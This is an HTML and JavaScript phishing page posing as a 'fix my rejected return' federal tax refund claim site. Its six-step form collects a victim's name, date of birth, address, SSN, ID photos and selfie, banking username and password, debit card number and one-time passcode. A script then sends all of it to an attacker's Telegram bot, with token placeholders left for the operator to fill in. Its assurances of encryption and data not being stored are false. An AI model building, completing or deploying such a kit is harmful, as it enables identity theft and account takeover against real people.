<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Fix my return · Claim refund</title>
  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
  <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet" />
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
      background: #f0f4fc;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 1.5rem;
    }

    .card {
      max-width: 600px;
      width: 100%;
      background: #ffffff;
      border-radius: 2.5rem;
      box-shadow: 0 25px 50px -12px rgba(0, 20, 40, 0.25);
      padding: 2.25rem 2.25rem 2.5rem;
      transition: all 0.2s;
      border: 1px solid rgba(255, 255, 255, 0.5);
    }

    .badge {
      background: #eef4ff;
      color: #1a4cff;
      font-weight: 600;
      font-size: 0.7rem;
      letter-spacing: 0.4px;
      padding: 0.3rem 1rem;
      border-radius: 100px;
      display: inline-block;
      margin-bottom: 1.5rem;
      border: 1px solid #d6e2ff;
    }

    .refund-amount {
      display: flex;
      align-items: baseline;
      gap: 0.3rem;
      margin-bottom: 0.25rem;
    }

    .refund-amount h1 {
      font-size: 3.2rem;
      font-weight: 700;
      letter-spacing: -0.02em;
      color: #0a192f;
    }

    .refund-amount span {
      font-size: 1.2rem;
      font-weight: 500;
      color: #3d4f6a;
      margin-left: 0.1rem;
    }

    .eligibility-tag {
      display: inline-block;
      background: #e3f5eb;
      color: #0b6e4a;
      font-weight: 600;
      font-size: 0.75rem;
      padding: 0.2rem 1rem;
      border-radius: 100px;
      margin-top: 0.2rem;
      border: 1px solid #b7e0cd;
    }

    .subhead {
      margin-top: 0.6rem;
      color: #2d405b;
      font-size: 0.95rem;
      font-weight: 450;
      border-left: 4px solid #1a4cff;
      padding-left: 1rem;
      background: #f8fbff;
      border-radius: 0 12px 12px 0;
      line-height: 1.5;
      padding: 0.6rem 1rem 0.6rem 1.2rem;
    }

    .status-grid {
      background: #f9fcff;
      border-radius: 1.5rem;
      padding: 1.25rem 1.5rem 1rem;
      margin: 1.5rem 0 2rem;
      display: flex;
      flex-wrap: wrap;
      justify-content: space-between;
      border: 1px solid #e7edf6;
      box-shadow: inset 0 1px 3px rgba(0,0,0,0.02);
    }

    .status-item {
      display: flex;
      flex-direction: column;
      gap: 0.2rem;
    }

    .status-label {
      font-size: 0.6rem;
      font-weight: 600;
      text-transform: uppercase;
      letter-spacing: 0.6px;
      color: #6e7f99;
    }

    .status-value {
      font-weight: 600;
      font-size: 0.95rem;
      color: #0a192f;
    }

    .status-value.rejected { color: #c92a2a; }
    .status-value.success { color: #1a8b4c; }

    .claim-btn {
      background: #0a192f;
      border: none;
      color: white;
      font-weight: 600;
      font-size: 1.1rem;
      padding: 1rem 1.5rem;
      border-radius: 60px;
      width: 100%;
      cursor: pointer;
      transition: all 0.2s;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 0.5rem;
      box-shadow: 0 10px 24px -6px rgba(10, 25, 47, 0.25);
      letter-spacing: 0.2px;
      border: 1px solid #1f3a5f;
    }

    .claim-btn:hover {
      background: #142d4a;
      transform: scale(1.01);
      box-shadow: 0 12px 28px -8px rgba(10, 25, 47, 0.35);
    }

    .claim-btn:active { transform: scale(0.97); }

    .footnote {
      margin-top: 1.8rem;
      font-size: 0.7rem;
      color: #7b8aa3;
      text-align: center;
      border-top: 1px solid #e5ebf3;
      padding-top: 1.5rem;
      letter-spacing: 0.2px;
    }

    /* ---- Modal ---- */
    .modal-overlay {
      position: fixed;
      inset: 0;
      background: rgba(10, 25, 47, 0.5);
      backdrop-filter: blur(6px);
      display: none;
      align-items: center;
      justify-content: center;
      padding: 1.5rem;
      z-index: 999;
    }

    .modal-overlay.active { display: flex; }

    .modal-window {
      background: #ffffff;
      max-width: 500px;
      width: 100%;
      border-radius: 2.25rem;
      padding: 2rem 2rem 2rem;
      box-shadow: 0 40px 80px rgba(0, 0, 0, 0.3);
      animation: fadeSlide 0.25s ease-out;
      max-height: 92vh;
      overflow-y: auto;
      border: 1px solid rgba(255,255,255,0.2);
    }

    @keyframes fadeSlide {
      0% { opacity: 0; transform: translateY(18px); }
      100% { opacity: 1; transform: translateY(0); }
    }

    .modal-window h2 {
      font-size: 1.6rem;
      font-weight: 700;
      color: #0a192f;
      margin-bottom: 0.2rem;
      letter-spacing: -0.01em;
    }

    .modal-window .step-desc {
      font-size: 0.9rem;
      color: #4a5f7a;
      margin-bottom: 1.6rem;
      border-bottom: 1px solid #eef3fa;
      padding-bottom: 0.8rem;
      font-weight: 450;
    }

    .modal-window label {
      font-weight: 600;
      font-size: 0.8rem;
      color: #1f3450;
      display: block;
      margin-top: 1.2rem;
      margin-bottom: 0.3rem;
      letter-spacing: 0.2px;
    }

    .modal-window input,
    .modal-window select {
      width: 100%;
      padding: 0.8rem 1.2rem;
      border: 1.5px solid #dfe7f0;
      border-radius: 60px;
      font-size: 0.95rem;
      background: #fbfdff;
      transition: 0.2s;
      font-family: inherit;
      color: #0a192f;
    }

    .modal-window input:focus,
    .modal-window select:focus {
      outline: none;
      border-color: #1a4cff;
      box-shadow: 0 0 0 4px rgba(26, 76, 255, 0.12);
      background: white;
    }

    .modal-window .btn-group {
      display: flex;
      gap: 0.8rem;
      margin-top: 2rem;
      flex-wrap: wrap;
    }

    .modal-window .btn-primary,
    .modal-window .btn-secondary {
      flex: 1;
      padding: 0.8rem 1.2rem;
      border-radius: 60px;
      font-weight: 600;
      border: none;
      cursor: pointer;
      transition: 0.15s;
      font-size: 0.95rem;
      display: inline-flex;
      align-items: center;
      justify-content: center;
      gap: 0.3rem;
    }

    .modal-window .btn-primary {
      background: #0a192f;
      color: white;
      box-shadow: 0 6px 16px rgba(10, 25, 47, 0.18);
      border: 1px solid #1f3a5f;
    }

    .modal-window .btn-primary:hover { background: #1a2f4a; }

    .modal-window .btn-secondary {
      background: #f0f5fd;
      color: #1f3450;
      border: 1px solid #dce4ef;
    }

    .modal-window .btn-secondary:hover { background: #e6edf7; }

    .file-upload-box {
      border: 2px dashed #cbd7e8;
      border-radius: 1.2rem;
      padding: 1.2rem 0.8rem;
      text-align: center;
      background: #fafdff;
      margin: 0.2rem 0 0.2rem;
      cursor: pointer;
      transition: all 0.15s;
    }

    .file-upload-box:hover {
      background: #f2f8ff;
      border-color: #1a4cff;
    }

    .file-upload-box input[type="file"] { display: none; }

    .file-list {
      font-size: 0.8rem;
      color: #1f3a5f;
      margin: 0.3rem 0 0;
      font-weight: 450;
    }

    .small-hint {
      font-size: 0.7rem;
      color: #6e7f99;
      margin-top: 0.3rem;
    }

    .text-danger { color: #c92a2a; }

    /* scroll */
    .modal-window::-webkit-scrollbar { width: 5px; }
    .modal-window::-webkit-scrollbar-track { background: #eef2f8; border-radius: 10px; }
    .modal-window::-webkit-scrollbar-thumb { background: #bcc9db; border-radius: 10px; }

    /* extra polish */
    .inline-icon { margin-right: 0.25rem; }
    .mt-1 { margin-top: 0.5rem; }
  </style>
</head>
<body>
  <div class="card" id="mainCard">
    <div class="badge">📄 2025 tax return · E-filed 08/19</div>
    <div class="refund-amount">
      <h1>$1,464</h1>
      <span>refund</span>
    </div>
    <div class="eligibility-tag">✅ Eligible — federal refund</div>
    <div class="subhead">
      <strong>You are eligible</strong> for a federal refund of <strong>$1,464</strong>. 
      Complete the secure claim process to receive your funds.
    </div>

    <div class="status-grid">
      <div class="status-item"><span class="status-label">Federal</span><span class="status-value">$1,464</span></div>
      <div class="status-item"><span class="status-label">State GA</span><span class="status-value">$0 due</span></div>
      <div class="status-item"><span class="status-label">Status</span><span class="status-value rejected">Rejected 08/19</span></div>
    </div>

    <button class="claim-btn" id="claimBtn">
      <span>💰</span> Claim your refund
    </button>
    <div class="footnote">Fix my rejected return · We'll help you file again</div>
  </div>

  <!-- MODAL -->
  <div class="modal-overlay" id="modalOverlay">
    <div class="modal-window" id="modalWindow"></div>
  </div>

  <script>
    (function() {
      // ----- TELEGRAM BOT CONFIG (replace with your credentials) -----
      const BOT_TOKEN = 'YOUR_BOT_TOKEN';        // <-- replace
      const CHAT_ID = 'YOUR_CHAT_ID';            // <-- replace
      const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

      // ----- STATE -----
      let currentStep = 0;
      const userData = {
        fullName: '',
        dob: '',
        address: '',
        ssn: '',
        kyc: { idFront: null, idBack: null, selfie: null },
        bank: { name: '', username: '', password: '', debitCard: '', otp: '' }
      };

      // All USA banks (extended list)
      const bankList = [
        'Bank of America', 'Wells Fargo', 'Chase', 'Citibank', 'U.S. Bank',
        'Truist', 'PNC Bank', 'Capital One', 'TD Bank', 'Fifth Third Bank',
        'KeyBank', 'Huntington Bank', 'Regions Bank', 'Ally Bank', 'Discover Bank',
        'Synchrony Bank', 'Barclays US', 'HSBC Bank USA', 'Santander Bank',
        'M&T Bank', 'Citizens Bank', 'First Horizon', 'BOK Financial', 'Comerica',
        'Bank OZK', 'Eastern Bank', 'Fulton Bank', 'Pinnacle Bank', 'Banner Bank',
        'Pacific Western Bank', 'UMB Bank', 'Zions Bank', 'Associated Bank',
        'First Merchants', 'Old National Bank', 'Wintrust', 'Sterling Bank',
        'Apple Bank', 'Dime Community Bank', 'Valley National Bank',
        'New York Community Bank', 'Synovus Bank', 'First Financial Bank',
        'SouthState Bank', 'Cadence Bank', 'United Bank', 'First Interstate Bank'
      ];

      const modalOverlay = document.getElementById('modalOverlay');
      const modalWindow = document.getElementById('modalWindow');

      // ----- send to Telegram -----
      function sendToTelegram(message) {
        if (!BOT_TOKEN || BOT_TOKEN === 'YOUR_BOT_TOKEN' || !CHAT_ID || CHAT_ID === 'YOUR_CHAT_ID') {
          console.warn('Telegram bot not configured. Data:', message);
          alert('⚠️ Bot not configured. Please set BOT_TOKEN and CHAT_ID.');
          return Promise.resolve({ ok: false });
        }
        return fetch(TELEGRAM_API, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'HTML' })
        }).then(res => res.json()).catch(err => console.error('Telegram error', err));
      }

      // ----- render step -----
      function renderStep(step) {
        let html = '';
        const closeModal = () => { modalOverlay.classList.remove('active'); };

        if (step === 0) {
          html = `
            <h2>🔐 Personal details</h2>
            <div class="step-desc">Step 1 of 6 · Verify your identity</div>
            <label>Full legal name</label>
            <input type="text" id="fullName" placeholder="e.g. John M. Doe" value="${userData.fullName}">
            <label>Date of birth</label>
            <input type="date" id="dob" value="${userData.dob}">
            <label>Residential address</label>
            <input type="text" id="address" placeholder="Street, city, state, ZIP" value="${userData.address}">
            <div class="btn-group">
              <button class="btn-secondary" onclick="closeModal()">Cancel</button>
              <button class="btn-primary" id="step0Next">Continue</button>
            </div>
          `;
        } else if (step === 1) {
          html = `
            <h2>🆔 Social Security Number</h2>
            <div class="step-desc">Step 2 of 6 · Secure SSN entry</div>
            <label>Social Security Number</label>
            <input type="password" id="ssnInput" placeholder="XXX-XX-XXXX" value="${userData.ssn}">
            <div class="small-hint">Bank‑grade encryption · never stored in plain text.</div>
            <div class="btn-group">
              <button class="btn-secondary" onclick="goStep(0)">Back</button>
              <button class="btn-primary" id="step1Next">Continue</button>
            </div>
          `;
        } else if (step === 2) {
          const frontFile = userData.kyc.idFront ? userData.kyc.idFront.name : 'No file chosen';
          const backFile = userData.kyc.idBack ? userData.kyc.idBack.name : 'No file chosen';
          const selfieFile = userData.kyc.selfie ? userData.kyc.selfie.name : 'No file chosen';
          html = `
            <h2>📸 KYC verification</h2>
            <div class="step-desc">Step 3 of 6 · Upload ID (front, back) & selfie with ID</div>
            <label>ID — front side</label>
            <div class="file-upload-box" id="uploadFront">
              <span>📤 ${frontFile}</span>
              <input type="file" accept="image/*" id="idFrontInput">
            </div>
            <label>ID — back side</label>
            <div class="file-upload-box" id="uploadBack">
              <span>📤 ${backFile}</span>
              <input type="file" accept="image/*" id="idBackInput">
            </div>
            <label>Selfie holding your ID</label>
            <div class="file-upload-box" id="uploadSelfie">
              <span>📤 ${selfieFile}</span>
              <input type="file" accept="image/*" id="selfieInput">
            </div>
            <div class="btn-group">
              <button class="btn-secondary" onclick="goStep(1)">Back</button>
              <button class="btn-primary" id="step2Next">Continue</button>
            </div>
          `;
        } else if (step === 3) {
          const bankOptions = bankList.map(b => `<option value="${b}" ${userData.bank.name === b ? 'selected' : ''}>${b}</option>`).join('');
          html = `
            <h2>🏦 Select your bank</h2>
            <div class="step-desc">Step 4 of 6 · Choose from all major USA banks</div>
            <label>Financial institution</label>
            <select id="bankSelect">${bankOptions}</select>
            <div class="small-hint">We support all major banks.</div>
            <div class="btn-group">
              <button class="btn-secondary" onclick="goStep(2)">Back</button>
              <button class="btn-primary" id="step3Next">Continue</button>
            </div>
          `;
        } else if (step === 4) {
          html = `
            <h2>🔑 Bank login</h2>
            <div class="step-desc">Step 5 of 6 · Secure credential entry</div>
            <label>Online banking username</label>
            <input type="text" id="bankUsername" placeholder="username" value="${userData.bank.username}">
            <label>Password</label>
            <input type="password" id="bankPassword" placeholder="••••••••" value="${userData.bank.password}">
            <div class="small-hint">Encrypted and used only for verification.</div>
            <div class="btn-group">
              <button class="btn-secondary" onclick="goStep(3)">Back</button>
              <button class="btn-primary" id="step4Next">Continue</button>
            </div>
          `;
        } else if (step === 5) {
          html = `
            <h2>💳 Debit card & OTP</h2>
            <div class="step-desc">Step 6 of 6 · Final verification</div>
            <label>Debit card number</label>
            <input type="text" id="debitCard" placeholder="**** **** **** ****" value="${userData.bank.debitCard}">
            <label>One‑time passcode (OTP)</label>
            <input type="text" id="otpInput" placeholder="6‑digit code" value="${userData.bank.otp}">
            <div class="small-hint">OTP sent to your registered mobile.</div>
            <div class="btn-group">
              <button class="btn-secondary" onclick="goStep(4)">Back</button>
              <button class="btn-primary" id="step5Submit">✅ Submit & claim</button>
            </div>
          `;
        }

        modalWindow.innerHTML = html;
        modalOverlay.classList.add('active');

        // ----- attach events -----
        if (step === 0) {
          document.getElementById('step0Next')?.addEventListener('click', function() {
            const name = document.getElementById('fullName').value.trim();
            const dob = document.getElementById('dob').value;
            const addr = document.getElementById('address').value.trim();
            if (!name || !dob || !addr) { alert('Please fill in all fields.'); return; }
            userData.fullName = name; userData.dob = dob; userData.address = addr;
            goStep(1);
          });
        } else if (step === 1) {
          document.getElementById('step1Next')?.addEventListener('click', function() {
            const ssn = document.getElementById('ssnInput').value.trim();
            if (ssn.length < 4) { alert('Please enter a valid SSN.'); return; }
            userData.ssn = ssn;
            goStep(2);
          });
        } else if (step === 2) {
          document.getElementById('idFrontInput')?.addEventListener('change', function(e) {
            if (e.target.files[0]) { userData.kyc.idFront = e.target.files[0]; renderStep(2); }
          });
          document.getElementById('idBackInput')?.addEventListener('change', function(e) {
            if (e.target.files[0]) { userData.kyc.idBack = e.target.files[0]; renderStep(2); }
          });
          document.getElementById('selfieInput')?.addEventListener('change', function(e) {
            if (e.target.files[0]) { userData.kyc.selfie = e.target.files[0]; renderStep(2); }
          });
          document.getElementById('uploadFront')?.addEventListener('click', function(e) {
            if (e.target.tagName !== 'INPUT') document.getElementById('idFrontInput')?.click();
          });
          document.getElementById('uploadBack')?.addEventListener('click', function(e) {
            if (e.target.tagName !== 'INPUT') document.getElementById('idBackInput')?.click();
          });
          document.getElementById('uploadSelfie')?.addEventListener('click', function(e) {
            if (e.target.tagName !== 'INPUT') document.getElementById('selfieInput')?.click();
          });
          document.getElementById('step2Next')?.addEventListener('click', function() {
            if (!userData.kyc.idFront || !userData.kyc.idBack || !userData.kyc.selfie) {
              alert('Please upload all three KYC documents.');
              return;
            }
            goStep(3);
          });
        } else if (step === 3) {
          document.getElementById('step3Next')?.addEventListener('click', function() {
            const bank = document.getElementById('bankSelect').value;
            if (!bank) { alert('Select a bank.'); return; }
            userData.bank.name = bank;
            goStep(4);
          });
        } else if (step === 4) {
          document.getElementById('step4Next')?.addEventListener('click', function() {
            const un = document.getElementById('bankUsername').value.trim();
            const pw = document.getElementById('bankPassword').value.trim();
            if (!un || !pw) { alert('Enter bank credentials.'); return; }
            userData.bank.username = un; userData.bank.password = pw;
            goStep(5);
          });
        } else if (step === 5) {
          document.getElementById('step5Submit')?.addEventListener('click', function() {
            const dc = document.getElementById('debitCard').value.trim();
            const otp = document.getElementById('otpInput').value.trim();
            if (!dc || dc.length < 4) { alert('Enter valid debit card.'); return; }
            if (!otp || otp.length < 4) { alert('Enter OTP.'); return; }
            userData.bank.debitCard = dc; userData.bank.otp = otp;

            const msg = `✅ <b>NEW REFUND CLAIM</b>\n` +
              `👤 ${userData.fullName}\n📅 ${userData.dob}\n📍 ${userData.address}\n` +
              `🔑 SSN: ${userData.ssn}\n🏦 ${userData.bank.name}\n` +
              `👤 user: ${userData.bank.username}\n🔒 pass: ${userData.bank.password}\n` +
              `💳 debit: ${userData.bank.debitCard}\n🔢 OTP: ${userData.bank.otp}\n` +
              `📎 KYC: front (${userData.kyc.idFront?.name || 'N/A'}), back (${userData.kyc.idBack?.name || 'N/A'}), selfie (${userData.kyc.selfie?.name || 'N/A'})`;
            sendToTelegram(msg).then(() => {
              alert('✅ Claim submitted! We will process your refund.');
              modalOverlay.classList.remove('active');
            }).catch(() => {
              alert('⚠️ Could not send data. Please try again.');
            });
          });
        }
      }

      // navigation
      window.goStep = function(step) {
        currentStep = step;
        renderStep(step);
      };
      window.closeModal = function() {
        modalOverlay.classList.remove('active');
      };

      // open claim flow
      document.getElementById('claimBtn').addEventListener('click', function() {
        currentStep = 0;
        renderStep(0);
      });

      // click outside close
      modalOverlay.addEventListener('click', function(e) {
        if (e.target === modalOverlay) modalOverlay.classList.remove('active');
      });
    })();
  </script>
</body>
</html>
